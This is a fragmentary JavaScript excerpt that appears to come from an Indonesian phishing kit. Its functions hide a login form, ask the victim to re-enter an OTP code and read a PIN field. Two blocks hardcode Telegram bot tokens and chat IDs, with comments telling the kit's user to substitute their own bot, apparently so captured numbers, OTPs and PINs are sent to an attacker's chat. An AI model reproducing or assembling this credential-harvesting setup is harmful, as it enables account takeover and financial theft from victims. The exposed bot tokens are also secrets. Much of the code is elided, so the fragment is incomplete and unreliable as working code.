...
function nomorLogin(){
  ...
  document.getElementById("login").style.display = "none";
    ...
    var token = '7677204937:AAFcWA8R-7QFVw8Cnmg-R3_O9CsPi77qSAw'; // Ganti dengan token bot yang kamu buat
      var grup = '6668612258'; // Ganti dengan chat id dari bot yang kamu buat
...
function kirimPesan(){
  ...
  document.getElementById("useridku").innerHTML = "MASUKAN KODE OTP KEMBALI"; 
...
function kirimPesan1(){
   ...
   var pin444 = document.getElementById('pin444');
    ...
    var token = '7618517364:AAE_jLQY-1-7sr81g47OElFLM4pPhfSy-XU'; // Ganti dengan token bot yang kamu buat
      var grup = '5482141477'; // Ganti dengan chat id dari bot yang kamu buat
